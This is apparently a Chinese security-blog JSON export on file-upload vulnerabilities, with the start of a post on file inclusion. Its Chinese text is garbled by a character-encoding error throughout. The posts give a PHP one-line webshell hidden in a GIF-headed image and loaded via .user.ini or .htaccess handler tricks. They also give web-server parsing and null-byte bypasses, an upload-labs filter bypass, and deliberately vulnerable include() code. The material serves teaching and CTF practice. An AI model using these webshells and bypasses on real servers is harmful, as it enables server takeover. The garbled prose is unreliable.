å…³é”®å­—123æ–‡ä»¶åä¸­åªè¦åŒ…å« .php å…³é”®å­—å°±å½“ä½œphpå¤„ç†ï¼šphpinfo.php.pngåœ¨ .htaccess æ–‡ä»¶ä¸­å†™å…¥ï¼šAddHandler php5-script php 3.3 åˆ©ç”¨ä¸‰ï¼šåŒ¹é…æ–‡ä»¶å1234åŒ¹é…æ–‡ä»¶åï¼šæ–‡ä»¶å&lt;FilesMatch &quot;æ–‡ä»¶å&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 3.4 åˆ©ç”¨å››ï¼šå°†æ‰€æœ‰æ–‡ä»¶åç¼€éƒ½å½“ä½œphpæ–‡ä»¶å¤„ç†1234.htaccess æ–‡ä»¶å½“ä¸­å†™å…¥ï¼š SetHandler application/x-httpd-php phpinfo1.gif å†™å…¥ï¼š&lt;?php phpinfo(); ?&gt; å››ã€.user.ini php.ini æ˜¯ PHP çš„ä¸€ä¸ª å…¨å±€é…ç½®æ–‡ä»¶ï¼ˆå…¨å±€çš„ï¼‰ï¼› .user.ini æ˜¯ PHPçš„ç›®å½•é…ç½®æ–‡ä»¶ï¼ˆå±€éƒ¨çš„ï¼‰ï¼Œç›¸å½“äºç”¨æˆ·è‡ªå·±å®šä¹‰çš„ä¸€ä¸ª php.ini æ–‡ä»¶ã€‚ PHPä¸­çš„æ¯ä¸ªé…ç½®éƒ½æœ‰å…¶æ‰€å¤„çš„æ¨¡å¼ã€‚å…¶ä¸­å…è®¸ä½¿ç”¨ .user.ini èƒ½å¤Ÿæ›´æ”¹çš„æ¨¡å¼æœ‰ PHP_INI_PERDIR å’Œ PHP_INI_USER ç­‰ç­‰ã€‚ è€Œ PHP_INI_PERDIR è¿™ä¸ªæ¨¡å¼å½“ä¸­çš„ auto_append_file å’Œ auto_prepend_file è¿™ä¸¤ä¸ªé…ç½®å¯¹æˆ‘ä»¬æœ‰å¾ˆå¤§å¸®åŠ©ã€‚ **auto_append_file ** ï¼šæŒ‡å®šä¸€ä¸ªæ–‡ä»¶åœ¨ä¸»æ–‡ä»¶è§£æä¹‹å‰è§£æï¼› auto_prepend_fileï¼šæŒ‡å®šä¸€ä¸ªæ–‡ä»¶åœ¨ä¸»æ–‡ä»¶ä¹‹åè§£æã€‚ åŸç†ï¼šæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ auto_prepend_file è¿™ä¸ªé€‰é¡¹ï¼Œå°†æˆ‘ä»¬æ‰€è¦ä¸Šä¼ çš„å›¾ç‰‡é©¬åœ¨è¯¥ç›®å½•ä¸‹çš„å…¶å®ƒPHPæ–‡ä»¶æ‰§è¡Œä¹‹å‰é¦–å…ˆ åŒ…å« æˆ‘ä»¬æ‰€ä¸Šä¼ çš„å›¾ç‰‡é©¬ã€‚ç›¸å½“äºåœ¨åŸæœ‰çš„ PHPæ–‡ä»¶çš„ä»£ç å¼€å¤´åŠ ä¸Šäº† require(&#39;a.jpg&#39;) ï¼Œä»è€Œè¿›è¡Œäº† æ–‡ä»¶åŒ…å«ï¼Œè¿™æ ·æˆ‘ä»¬çš„å›¾ç‰‡é©¬å°±å¾—åˆ°äº†åˆ©ç”¨ã€‚ ä¼˜ç‚¹ï¼šä¸ä»…ä»…é™äº Apache æœåŠ¡å™¨ï¼Œè¿˜å¯ä»¥ç”¨äº Nginx , IIS ç­‰æœåŠ¡å™¨ã€‚ ä½¿ç”¨æ¡ä»¶ï¼š ä¸Šä¼ çš„ .user.ini ç›®å½•ä¸‹å¿…é¡»å«æœ‰ .php æ–‡ä»¶ï¼Œè€Œä¸€èˆ¬çš„é¢˜ç›®å½“ä¸­ä¸ä¼šå«æœ‰ã€‚ æœåŠ¡å™¨ä½¿ç”¨CGIï¼FastCGIæ¨¡å¼ åˆ©ç”¨ï¼š 123.user.ini æ–‡ä»¶ï¼šGIF89a auto_prepend_file=a.jpg 123a.jpg :GIF89a&lt;script language=&#x27;php&#x27;&gt; @eval($_POST[&#x27;pass&#x27;]);&lt;/script&gt; äº”ã€Webå®¹å™¨è§£ææ¼æ´5.1 Apache è§£ææ¼æ´5.1.1 å¤šåç¼€æ–‡ä»¶è§£ææ¼æ´Apacheå½“ä¸­ï¼Œå¤šåç¼€æ–‡ä»¶å°†ä¼šä»æœ€å³è¾¹çš„åç¼€å¼€å§‹è¯†åˆ«ï¼Œå¦‚æœåç¼€ä¸åœ¨å¯¹åº”çš„ MIME type æˆ–è€…æ˜¯ Handerï¼Œå°±ä¼šç»§ç»­å‘å·¦è¯†åˆ«ï¼Œç›´åˆ°åç¼€æœ‰å¯¹åº”çš„MIME type æˆ– Handerã€‚ åˆ©ç”¨ï¼š 1phpinfo.php.xxx.xx.x æ³¨ï¼šè¯¥æ¼æ´æ¯”è¾ƒå¤è€ï¼Œå¤§éƒ¨åˆ†å·²ç»ä¿®å¤è¿‡äº†ï¼Œä½†æ˜¯ä¼šå‡ºç°åœ¨CTFä¸­ 5.1.2 CVE-2017-15715 æ¼æ´é€‚ç”¨ç‰ˆæœ¬ï¼š2.4.0-2.4.29ç‰ˆæœ¬ åˆ©ç”¨ï¼š 1phpinfo.php\\n ###xxx.asp;1.jpg 123å°†ä¸Šä¼ çš„ time.aspæ–‡ä»¶ æŠ“åŒ… ä¿®æ”¹åç¼€æˆä¸ºï¼štime.asp;1.jpg //åƒè¿™æ ·çš„æ–‡ä»¶åå¯ä»¥é€šè¿‡ç™½åå•ï¼Œä½†æ˜¯å´å¯ä»¥è¢«è§£æä¸º .aspæ–‡ä»¶# å†…å®¹ï¼š&lt;%=time()%&gt; ä½œä¸ºè¯•éªŒ 5.1.3 x.asp/time.jpg123é¦–å…ˆåˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼šä¾‹å¦‚ï¼š1.aspä¸Šä¼ .aspæ–‡ä»¶ï¼štime.jpg //å†…å®¹ï¼š&lt;% =time()%&gt; &lt;% =now()%&gt;è®¿é—®ï¼š1.asp/time.jpg //å°†ä¼šè¢«å½“ä½œ.aspæ–‡ä»¶è¿›è¡Œè§£æ 5.3 PHP CGI è§£ææ¼æ´æ¡ä»¶ï¼šIIS 7.0 / 7.5 1.æ­å»º IIS æœåŠ¡å™¨ win-2008 ä¸‹ä¸€æ­¥ï¼Œç‚¹å‡»å®‰è£… 2.ä½¿ IIS æ”¯æŒ PHPè„šæœ¬ç±»å‹ â€¦â€¦æœªå®Œæˆ æœ€ç»ˆçš„æ•ˆæœæ˜¯ï¼š 1234phpinfo.png è¯¥å›¾ç‰‡çš„å†…å®¹æ˜¯ &lt;?php phpinfo(); ?&gt; ä½†æ˜¯æ— æ³•ç›´æ¥è®¿é—® è€Œå¦‚æœ è®¿é—® phpinfo.png/.php å°±å¯ä»¥è¢«è§£æ é˜²å¾¡é¿å…åªéœ€è¦ï¼š æœ¬è´¨ä¸Šæ˜¯ä¸ php.ini ä¸­çš„ cgi.fix_pathinfo é…ç½®é€‰é¡¹æœ‰å…³ï¼Œç­‰äº1å³æœ‰æ¼æ´ï¼Œç­‰äº0åˆ™æ— ã€‚ å…­ã€Nginx è§£ææ¼æ´6.1 Nginx è§£ææ¼æ´ åŸç†ä¸PHP CGI è§£ææ¼æ´ç›¸åŒâ€“ä¸ php.ini ä¸­çš„ cgi.fix_pathinfo é…ç½®é€‰é¡¹æœ‰å…³ï¼Œç­‰äº1å³æœ‰æ¼æ´ï¼Œç­‰äº0åˆ™æ— ã€‚ 1phpinfo.php/.php 6.2 Nginx ç©ºå­—èŠ‚æ¼æ´(é›¶é›¶æˆªæ–­)12phpinfo.html%00.php .php åç¼€ ä½¿ Nginx å°† phpinfo.htmlæ–‡ä»¶ å½“ä½œ phpæ–‡ä»¶å¤„ç† 6.3 Nginx æ–‡ä»¶åé€»è¾‘æ¼æ´(é›¶é›¶æˆªæ–­)12ä¸Šä¼  phpinfo.pngç©ºæ ¼è®¿é—® phpinfo.png ..php å…¶ä¸­å°†ç¬¬ä¸€ä¸ª . çš„åå…­è¿›åˆ¶æ›´æ”¹ä¸º 00 6.4 æ–‡ä»¶åé€»è¾‘æ¼æ´ (CVE-2013-4547)å—å½±å“çš„nginxç‰ˆæœ¬: 0.8.41è‡³1.4.3å’Œ1.5.7ä¹‹å‰çš„1.5.x 1æ­£å¸¸ä¸Šä¼ ä¸€ä¸ªé™„åŠ ä»£ç çš„å›¾ç‰‡&quot;test.jpg&quot;ï¼Œè®¿é—®æ—¶åé¢+&quot;ç©ºæ ¼&quot;+&quot;\\0&quot;+&quot;.php&quot;ï¼Œå³è®©å›¾ç‰‡ä½œä¸ºphpæ–‡ä»¶è§£æ ä¸ƒã€ç¼–è¾‘å™¨ä¸Šä¼ ç½‘ç«™çš„åå°ç¼–è¾‘ç½‘é¡µçš„åœ¨çº¿ç¼–è¾‘å™¨ï¼Œä¸€èˆ¬éƒ½ä¼šè‡ªåŠ¨é›†æˆæ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ï¼Œæœ‰äº›å«æœ‰æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚ evebeditor è¿›å…¥åå°å¯ä¿®æ”¹ ç›¸å…³é…ç½® ï¼Œæ¯”å¦‚ä¸Šä¼ æ–‡ä»¶çš„ ç™½åå•ï¼Œæˆ‘ä»¬å¯ä»¥æ·»åŠ ä¸Šæˆ‘ä»¬æƒ³ä¸Šä¼ çš„è„šæœ¬ç±»å‹ï¼›æˆ–è€…æ˜¯åœ¨é…ç½®å½“ä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œä¾‹å¦‚å°†è¯¥ç½‘é¡µçš„ä¸€äº›æ ‡é¢˜æ›´æ”¹ä¸ºæˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬ï¼Œç­‰å¾…åˆ«äººä¸Šé’©ã€‚ fckeditor åå°èµ„æºç®¡ç†å™¨ï¼Œç›´æ¥è¿›è¡Œä¸Šä¼  æŠ€å·§ï¼šæŠ“åŒ…æŸ¥çœ‹æ—¶ï¼Œå¯ä»¥çœ‹åˆ°å…¶WebæœåŠ¡å™¨ï¼Œå¯ä»¥åˆ©ç”¨ç›¸å…³çš„WebæœåŠ¡å™¨çš„è§£ææ¼æ´è¿›è¡Œä¸Šä¼ ï¼Œä¾‹å¦‚ï¼šIISè§£ææ¼æ´ï¼› å¦‚æœæ‰€è®¿é—®çš„æœåŠ¡å™¨è¿›è¡Œäº†é˜²å¾¡ï¼Œå½“æˆ‘ä»¬æˆåŠŸä¸Šä¼ å¤§é©¬ä¹‹åï¼Œå½“æˆ‘ä»¬è¿›è¡Œè®¿é—®æ—¶ï¼Œå®ƒä¼šè‡ªåŠ¨è·³è½¬åˆ°åˆ«çš„åœ°æ–¹ï¼Œè¾¾ä¸åˆ°æˆ‘ä»¬æƒ³è¦çš„æ•ˆæœã€‚ æ€è·¯ï¼šé¦–å…ˆä¸Šä¼ ä¸€ä¸ªå°é©¬ï¼Œæ‹¿åˆ°webshellä¹‹åï¼Œåœ¨åˆ«çš„è·¯å¾„ä¹‹ä¸‹å†ä¸Šä¼ æˆ‘ä»¬çš„å¤§é©¬ å…«ã€é›¶é›¶æˆªæ–­8.1 0x00æˆªæ–­åŸç†ç³»ç»Ÿåœ¨å¯¹æ–‡ä»¶åçš„è¯»å–æ—¶ï¼Œå¦‚æœé‡åˆ°asciiç ä¸ºé›¶çš„ä½ç½®å°±åœæ­¢ï¼Œè€Œè¿™ä¸ªasciiç ä¸ºé›¶çš„ä½ç½®åœ¨16è¿›åˆ¶ä¸­æ˜¯00ï¼Œç”¨0xå¼€å¤´è¡¨ç¤º0x00ï¼Œå°±ä¼šè®¤ä¸ºè¯»å–å·²ç»“æŸï¼Œä¹Ÿå°±æ˜¯æ‰€è¯´çš„0x00æˆªæ–­ã€‚ 8.2 URLä¸­çš„ %00ç³»ç»Ÿæ˜¯æŒ‰16è¿›åˆ¶è¯»å–æ–‡ä»¶ï¼ŒURLä¸­çš„ %00 æ˜¯è¢«æœåŠ¡å™¨è§£ç ä¸º 0x00 è€Œå‘æŒ¥äº†æˆªæ–­ä½œç”¨ã€‚ 8.3 æˆªæ–­åˆ©ç”¨åˆ©ç”¨æ¡ä»¶ï¼šphpç‰ˆæœ¬å°äº 5.3.4 ä¸” é­”æœ¯å¼•å·å…³é—­ URLä¸­çš„ %00 ä¼šè‡ªåŠ¨è¢«è§£ç ä¸º 0x00 ï¼Œæ‰€ä»¥éœ€è¦æ—¶ç›´æ¥è¾“å…¥ä¸Š %00 ï¼Œå³å¯å‘æŒ¥æˆªæ–­ä½œç”¨ï¼›ä»¥å…¶å®ƒæ–¹å¼æäº¤å¹¶ä¸”éœ€è¦æˆªæ–­æ—¶ï¼Œéœ€è¦å°†å…¶è§£ç ä¸ºåå…­è¿›åˆ¶çš„ç›¸åº”ä½ç½®æ‰‹åŠ¨æ›´æ”¹ä¸º 00 ï¼Œæ‰èƒ½å‘æŒ¥æˆªæ–­ä½œç”¨ã€‚ GET æ–¹å¼æäº¤â€“ä¼šè‡ªåŠ¨å°† %00 è§£æä¸º 0x00 ï¼Œå‘æŒ¥æˆªæ–­ä½œç”¨ POST æ–¹å¼æäº¤â€“éœ€è¦æ‰‹åŠ¨å°†å…¶è§£ç ä¸º åå…­è¿›åˆ¶çš„ 00 ï¼Œå‘æŒ¥æˆªæ–­ä½œç”¨ ä¹ã€å®æˆ˜9.1 ç”±å˜é‡è¦†ç›–å¼•èµ·çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´metinfov5.0.4 ä¿®æ”¹å˜é‡çš„å€¼â€“æ„å‘³ç€å¯ä¿®æ”¹é…ç½®â€“å¯è¦†ç›–æ•°æ®åº“ç”¨æˆ·åï¼Œå¯†ç ï¼Œç­‰å¾…å†…å®¹ï¼Œä½¿å…¶è¿æ¥åˆ°è‡ªå·±çš„æœåŠ¡å™¨ä¸Š foreachéå†æ•°ç»„ 12345678&lt;?php $name = &quot;aaa&quot;;//ä¼ å‚ ?name=bbb foreach($_GET as $key =&gt; $val)&#123; $$key = $val; //å°†å˜æˆ $name = bbb &#125; var_dump($name); //è¿™æ ·ç›¸å½“äºå°†ä¸Šé¢çš„$nameçš„å€¼é€šè¿‡æˆ‘ä»¬çš„GETä¼ å‚è¿›è¡Œäº†ä¿®æ”¹?&gt; 9.2 å¸¸è§ CMS æ–‡ä»¶ä¸Šä¼ æ¼æ´CMS â€“ å†…å®¹ç®¡ç†ç³»ç»Ÿï¼Œå¸¸è¢«ç”¨äº é€šè¿‡ä½¿ç”¨å…¶ä¸Šçš„ç½‘ç«™æ¨¡æ¿äºŒè¿›è¡ŒäºŒæ¬¡å¼€å‘ï¼Œä»è€Œ å¿«é€Ÿå»ºç«™ dedeCMS PHPcms å—æ–¹æ•°æ®ç®¡ç†ç³»ç»Ÿ .asp access .mdbæ–‡ä»¶ SQLæ³¨å…¥ æŸ¥è¯¢ ç®¡ç†å‘˜å¯†ç  å¾¡å‰‘æ‰«æ åå° è¿›è¡Œç™»å½• æ–‡ä»¶ä¸Šä¼  å¤§é©¬ï¼Œç»•è¿‡é™åˆ¶ï¼Œè·å–è·¯å¾„ é€šè¿‡æ‰€ä¸Šä¼ çš„å›¾ç‰‡æœ¨é©¬è·¯å¾„è¿›è¡Œ æ•°æ®åº“å¤‡ä»½ å°†åç¼€å¤‡ä»½æˆä¸º .asp é˜²å¾¡ï¼š ç«™åº“åˆ†ç¦» ä¸ç»™ Databackup æ‰§è¡Œæƒé™ å¯¹ æ•°æ®åº“å¤‡ä»½åŠŸèƒ½ çš„è¿‡æ»¤ï¼šæ•°æ®åº“åç§°ä¸å¯æ›´æ”¹ï¼ˆåç¼€å¼ºåˆ¶ä¸º.mdbï¼‰ æ‰€å¤‡ä»½çš„åç§° ä¸å…è®¸æ›´æ”¹åç¼€ 9.3 upload-labs â€“ Pass-21Pass-2112345678910111213explode() å‡½æ•°ä½¿ç”¨ä¸€ä¸ªå­—ç¬¦ä¸²åˆ†å‰²å¦ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›ç”±å­—ç¬¦ä¸²ç»„æˆçš„æ•°ç»„ç¤ºä¾‹ï¼š&lt;?php$str = &quot;www.runoob.com&quot;;print_r (explode(&quot;.&quot;,$str));?&gt;è¿è¡Œç»“æœï¼šArray( [0] =&gt; www [1] =&gt; runoob [2] =&gt; com) 1count() å‡½æ•°è¿”å›æ•°ç»„ä¸­å…ƒç´ çš„æ•°ç›® 123456789101112131415161718192021222324252627282930313233$is_upload = false;$msg = null;if(!empty($_FILES[&#x27;upload_file&#x27;]))&#123; //æ£€æŸ¥MIME $allow_type = array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;); if(!in_array($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;],$allow_type))&#123; $msg = &quot;ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!&quot;; &#125;else&#123; //æ£€æŸ¥æ–‡ä»¶å $file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;]; if (!is_array($file)) &#123; $file = explode(&#x27;.&#x27;, strtolower($file)); &#125; $ext = end($file); $allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); if (!in_array($ext, $allow_suffix)) &#123; $msg = &quot;ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!&quot;; &#125;else&#123; $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1]; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = &quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;; $is_upload = true; &#125; else &#123; $msg = &quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;; &#125; &#125; &#125;&#125;else&#123; $msg = &quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼&quot;;&#125; 123456åˆ†æï¼š1.é¦–å…ˆåˆ¤æ–­ MIME ç±»å‹ï¼Œå¿…é¡»ä¸º &#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;2.åˆ¤æ–­ $_POST[&#x27;save_name&#x27;]æ˜¯å¦ä¸ºç©ºï¼Œä¸ä¸ºç©ºçš„è¯ï¼Œå°±å°† $_POST[&#x27;save_name&#x27;] èµ‹å€¼ç»™ $file3.åˆ¤æ–­ $file æ˜¯å¦ä¸ºæ•°ç»„ï¼Œä¸æ˜¯çš„è¯ï¼Œä½¿ç”¨ . å°†å…¶åˆ†å‰²ä¸ºæ•°ç»„å…ƒç´ 4.åˆ¤æ–­æ–‡ä»¶åç¼€åï¼šå– $file æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´  ä½œä¸º $ext çš„å€¼ï¼Œåˆ¤æ–­æ˜¯å¦ç¬¦åˆç™½åå•5.ç¬¦åˆçš„è¯ï¼Œä½¿ç”¨ reset($file)å‡½æ•°å– æ•°ç»„ $fileçš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œæ‹¼æ¥ä¸€ä¸ª&quot;.&quot;ï¼Œç„¶åå†æ‹¼æ¥ä¸Š è¯¥æ•°ç»„å«æœ‰å…ƒç´ ä¸ªæ•°-1 çš„å…ƒç´  ä½œä¸ºæ–‡ä»¶å 123456ç»•è¿‡åˆ†æï¼š1.æŠ“åŒ…æ›´æ”¹ MIMEç±»å‹--image/jpeg2.å°†ç”¨æˆ·æ‰€è¾“å…¥çš„ &quot;save_name&quot; æ›´æ”¹ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¹¶èµ‹å€¼ï¼š$save_name[0] = 2121.php/ï¼›$save_name[1] = NULL;$save_name[2] = jpg3.åˆ™ $file æœ¬èº«å°±æˆä¸ºäº†ä¸€ä¸ªæ•°ç»„ï¼Œä¸ä¼šè¢« . åˆ†å‰²ï¼›reset($file) å°†ä¼šæ˜¯ $file çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå³ 2121.php/ï¼›ç”±äº $file[1] = NULLï¼ˆä¸å¯ä»¥è¿™ä¹ˆè¯´ï¼Œå› ä¸ºNULLä¸ç­‰äºç©ºï¼Œå¦‚æœåƒè¿™æ ·è®¾ç½®$file[1] = NULLï¼Œcount()æ‰€è®¡ç®—çš„ä¸ªæ•°å½“ä¸­æ˜¯åŒ…å«è¯¥å…ƒç´ çš„ï¼Œè¿™é‡Œåªæ˜¯ä¸ºäº†ä¾¿äºç†è§£ï¼‰ï¼Œåˆ™count($file) å°†ä¼šæ˜¯2ï¼Œæ‰€ä»¥æœ€ç»ˆæ‹¼æ¥è€Œæˆçš„ $file_name = 2121.php/. å› æ­¤è§£æä¹‹åä¼šè‡ªåŠ¨å¿½ç•¥æ‰ /. ï¼Œåˆ™æœ€ç»ˆä¸Šä¼ çš„æ–‡ä»¶åæ˜¯ 2121.php 9.4 Weblogic ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆCVE-2018-2894ï¼‰Weblogic ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆCVE-2018-2894ï¼‰ 12345docker-compose builddocker-compose up -dè®¿é—® http://192.168.254.110:7001/consoleæŸ¥çœ‹ç®¡ç†å‘˜å¯†ç  docker-compose logs | grep passwordç™»å½•è¿›å» åã€è¡¥å……10.1 $_FIFES1234567äºŒã€$_FILES$_FILESæ•°ç»„å†…å®¹ï¼š$_FILES[&#x27;myFile&#x27;][&#x27;name&#x27;] å®¢æˆ·ç«¯æ–‡ä»¶çš„åŸåç§°$_FILES[&#x27;myFile&#x27;][&#x27;type&#x27;] æ–‡ä»¶çš„ MIME ç±»å‹$_FILES[&#x27;myFile&#x27;][&#x27;size&#x27;] ä¸Šä¼ æ–‡ä»¶çš„å¤§å°ï¼Œå•ä½ä¸ºå­—èŠ‚ $_FILES[&#x27;myFile&#x27;][&#x27;tmp_name&#x27;] æ–‡ä»¶è¢«ä¸Šä¼ ååœ¨æœåŠ¡ç«¯å‚¨å­˜çš„ä¸´æ—¶æ–‡ä»¶åï¼Œä¸€èˆ¬æ˜¯ç³»ç»Ÿé»˜è®¤ã€‚å¯ä»¥åœ¨php.iniçš„upload_tmp_dir æŒ‡å®šï¼Œä½† ç”¨ putenv() å‡½æ•°è®¾ç½®æ˜¯ä¸èµ·ä½œç”¨çš„$_FILES[&#x27;myFile&#x27;][&#x27;error&#x27;] è¯¥æ–‡ä»¶ä¸Šä¼ ç›¸å…³çš„é”™è¯¯ä»£ç  10.2 æˆªæ–­ç»•è¿‡00æˆªæ–­é˜²å¾¡ ä½¿ç”¨ $_FILESï¼šç”±äºä¼ å…¥çš„ $_FILES[â€˜nameâ€™] å·²ç»æ˜¯æˆªæ–­è¿‡åçš„ï¼Œä¹‹åå¦‚æœä½¿ç”¨ç™½åå•å»åˆ¤æ–­ï¼Œæ˜¾ç„¶æ˜¯ä¸èƒ½æˆåŠŸä¸Šä¼ çš„ã€‚ **isInvalid()**ï¼šå¯ç”¨äºåˆ¤æ–­æ–‡ä»¶åæ˜¯å¦åˆæ³•ï¼Œå³ä¸å…è®¸æ–‡ä»¶åå½“ä¸­å«æœ‰ \\0ã€‚å¦‚æœæ–‡ä»¶åä¸åˆæ³•ï¼Œå°†æŠ›å‡ºå¼‚å¸¸è€Œé€€å‡ºæµç¨‹ã€‚ è½¬æ¢å­—ç¬¦é›†é€ æˆæˆªæ–­æ¡ä»¶ï¼šPHPç‰ˆæœ¬ &lt; 5.4 iconv() å‡½æ•°å¯ä»¥å°†ä¸€ç§å·²çŸ¥çš„å­—ç¬¦é›†æ–‡ä»¶è½¬æ¢æˆå¦ä¸€ç§å·²çŸ¥çš„å­—ç¬¦é›†æ–‡ä»¶ã€‚å®ƒçš„ä½œç”¨æ˜¯åœ¨å¤šç§å›½é™…ç¼–ç æ ¼å¼ä¹‹é—´è¿›è¡Œæ–‡æœ¬å†…ç çš„è½¬æ¢ã€‚","categories":[{"name":"Webæ¼æ´åŸºç¡€ç¯‡","slug":"Webæ¼æ´åŸºç¡€ç¯‡","permalink":"https://xizhi-future.github.io/categories/Web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E7%AF%87/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://xizhi-future.github.io/tags/Web/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","permalink":"https://xizhi-future.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"æ¼æ´","slug":"æ¼æ´","permalink":"https://xizhi-future.github.io/tags/%E6%BC%8F%E6%B4%9E/"}],"author":"xizhi-future"},{"title":"æ–‡ä»¶åŒ…å«ã€è¯»å–ã€ä¸‹è½½æ¼æ´","slug":"æ–‡ä»¶åŒ…å«ã€è¯»å–ã€ä¸‹è½½æ¼æ´","date":"2021-06-06T14:42:17.000Z","updated":"2021-10-07T10:18:50.617Z","comments":true,"path":"2021/06/06/æ–‡ä»¶åŒ…å«ã€è¯»å–ã€ä¸‹è½½æ¼æ´/","link":"","permalink":"https://xizhi-future.github.io/2021/06/06/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E3%80%81%E8%AF%BB%E5%8F%96%E3%80%81%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/","excerpt":"æ¦‚è¿°ï¼šæœ‰å…³æ–‡ä»¶çš„å¸¸è§æ¼æ´ï¼šåŒ…æ‹¬æ–‡ä»¶åŒ…å«æ¼æ´ã€æ–‡ä»¶è¯»å–æ¼æ´ã€æ–‡ä»¶ä¸‹è½½æ¼æ´ã€‚","text":"æ¦‚è¿°ï¼šæœ‰å…³æ–‡ä»¶çš„å¸¸è§æ¼æ´ï¼šåŒ…æ‹¬æ–‡ä»¶åŒ…å«æ¼æ´ã€æ–‡ä»¶è¯»å–æ¼æ´ã€æ–‡ä»¶ä¸‹è½½æ¼æ´ã€‚ ä¸€ã€æ–‡ä»¶åŒ…å«æ¼æ´â€“æ–‡ä»¶è¢«è§£æå°±æ˜¯å°†æ‰€åŒ…å«çš„æ–‡ä»¶å½“ä½œè„šæœ¬å»æ‰§è¡Œ PHPå½“ä¸­åŒ…å«å‡½æ•° å‡½æ•° æè¿° include() æ–‡ä»¶åŒ…å«å¤±è´¥æ—¶ï¼Œä¼šäº§ç”Ÿ è­¦å‘Šï¼Œä½†è„šæœ¬ å°†ç»§ç»­æ‰§è¡Œ include_once() ä½œç”¨ä¸include()ç›¸åŒï¼Œä½†æ–‡ä»¶åªä¼šè¢«åŒ…å«ä¸€æ¬¡ require() æ–‡ä»¶åŒ…å«å¤±è´¥æ—¶ï¼Œä¼šäº§ç”Ÿ é”™è¯¯ï¼Œ ç›´æ¥ç»“æŸè„šæœ¬æ‰§è¡Œ require_once() ä½œç”¨ä¸require()ç›¸åŒï¼Œä½†æ–‡ä»¶åªä¼šè¢«åŒ…å«ä¸€æ¬¡ æˆå›  1.Webåº”ç”¨å®ç°äº† åŠ¨æ€åŒ…å«2.åŠ¨æ€åŒ…å«çš„æ–‡ä»¶è·¯å¾„å‚æ•°ï¼Œå®¢æˆ·ç«¯å¯æ§ ç›¸å…³é…ç½® æœ¬åœ°æ–‡ä»¶åŒ…å« (LFI)ï¼šå¯ä»¥è¯»å–ä¸æ‰“å¼€æœ¬åœ°æ–‡ä»¶è¿œç¨‹æ–‡ä»¶åŒ…å« (RFI)(HTTP,FTP,PHPä¼ªåè®®)ï¼šå¯ä»¥è¿œç¨‹åŠ è½½æ–‡ä»¶ 123php.iniæ–‡ä»¶ï¼šæœ¬åœ°ï¼šallow_url_fopen=On/Offè¿œç¨‹ï¼šallow_url_include-On/Off 1234567&lt;?phpif(isset($_GET[&#x27;path&#x27;]))&#123; include $_GET[&#x27;path&#x27;];&#125;else&#123; echo &quot;?path=info.php&quot;;&#125;?&gt; 12345æœ¬åœ°ï¼šå¯é€šè¿‡ç›¸å¯¹è·¯å¾„æ–¹å¼æ‰¾åˆ°æ–‡ä»¶?path=info.phpè¿œç¨‹ï¼šå¯é€šè¿‡http(s)æˆ–è€…ftpç­‰æ–¹å¼è¿œç¨‹åŠ è½½æ–‡ä»¶?path=http://......info.php?path=ftp://......info.php åˆ†ç±» allow_url_fopen = On allow_url_include = On æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼šé€šè¿‡æµè§ˆå™¨åŒ…å«webæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ï¼Œè¿™ç§æ¼æ´æ˜¯å› ä¸ºæµè§ˆå™¨åŒ…å«æ–‡ä»¶æ—¶æ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤å…è®¸éå†ç›®å½•çš„å­—ç¬¦æ³¨å…¥æµè§ˆå™¨å¹¶æ‰§è¡Œ è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼šå°±æ˜¯å…è®¸æ”»å‡»è€…åŒ…å«ä¸€ä¸ªè¿œç¨‹çš„æ–‡ä»¶,ä¸€èˆ¬æ˜¯åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šé¢„å…ˆè®¾ç½®å¥½çš„è„šæœ¬ã€‚ æ­¤æ¼æ´æ˜¯å› 